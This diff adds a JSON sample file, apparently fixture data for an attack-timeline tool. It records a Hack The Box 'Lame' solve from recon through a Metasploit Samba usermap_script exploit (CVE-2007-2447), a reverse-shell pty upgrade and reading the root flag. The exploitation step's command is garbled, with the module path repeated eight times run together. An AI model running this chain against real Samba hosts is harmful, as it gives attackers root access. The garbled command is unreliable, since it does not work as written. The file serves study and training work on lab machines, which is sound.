@@ -1,0 +1,70 @@
+{
+  "id": "sample-htb-lame",
+  "title": "HTB: Lame",
+  "type": "CTF",
+  "description": "Classic beginner-friendly Hack The Box machine. Samba usermap_script RCE leading to root.",
+  "target": "10.10.10.3",
+  "tags": ["linux", "samba", "easy"],
+  "events": [
+    {
+      "id": "e1",
+      "title": "Nmap full port scan",
+      "phase": "Reconnaissance",
+      "command": "nmap -p- -sC -sV -oN nmap/full.txt 10.10.10.3",
+      "description": "Full TCP port sweep with default scripts and version detection to enumerate the attack surface.",
+      "comments": "FTP, SSH, Samba (139/445) and an old NFS mount all open.",
+      "datetime": "2026-01-05T09:02:00Z",
+      "connections": ["e2"]
+    },
+    {
+      "id": "e2",
+      "title": "Enumerate Samba shares",
+      "phase": "Reconnaissance",
+      "command": "smbclient -L //10.10.10.3 -N",
+      "description": "List available SMB shares anonymously.",
+      "comments": "tmp share is world-writable, version reported as Samba 3.0.20.",
+      "datetime": "2026-01-05T09:14:00Z",
+      "connections": ["e3"]
+    },
+    {
+      "id": "e3",
+      "title": "Search for known Samba exploit",
+      "phase": "Weaponization",
+      "command": "searchsploit samba 3.0.20",
+      "description": "Look for a public exploit matching the fingerprinted Samba version.",
+      "comments": "usermap_script RCE (CVE-2007-2447) is a match.",
+      "datetime": "2026-01-05T09:20:00Z",
+      "connections": ["e4"]
+    },
+    {
+      "id": "e4",
+      "title": "Launch usermap_script exploit",
+      "phase": "Exploitation",
+      "command": "use exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_script\nset RHOSTS 10.10.10.3\nset LHOST tun0\nrun",
+      "description": "Metasploit module exploiting the username map script command injection to get a shell.",
+      "comments": "Lands as root immediately, no privesc chain needed.",
+      "datetime": "2026-01-05T09:31:00Z",
+      "connections": ["e5"]
+    },
+    {
+      "id": "e5",
+      "title": "Stabilize shell",
+      "phase": "Installation",
+      "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "description": "Upgrade the raw reverse shell to a fully interactive TTY.",
+      "comments": "",
+      "datetime": "2026-01-05T09:33:00Z",
+      "connections": ["e6"]
+    },
+    {
+      "id": "e6",
+      "title": "Read root flag",
+      "phase": "Actions on Objectives",
+      "command": "cat /root/root.txt",
+      "description": "Confirm full compromise by reading the root flag.",
+      "comments": "Box rooted in under 35 minutes.",
+      "datetime": "2026-01-05T09:35:00Z",
+      "connections": []
+    }
+  ]
+}
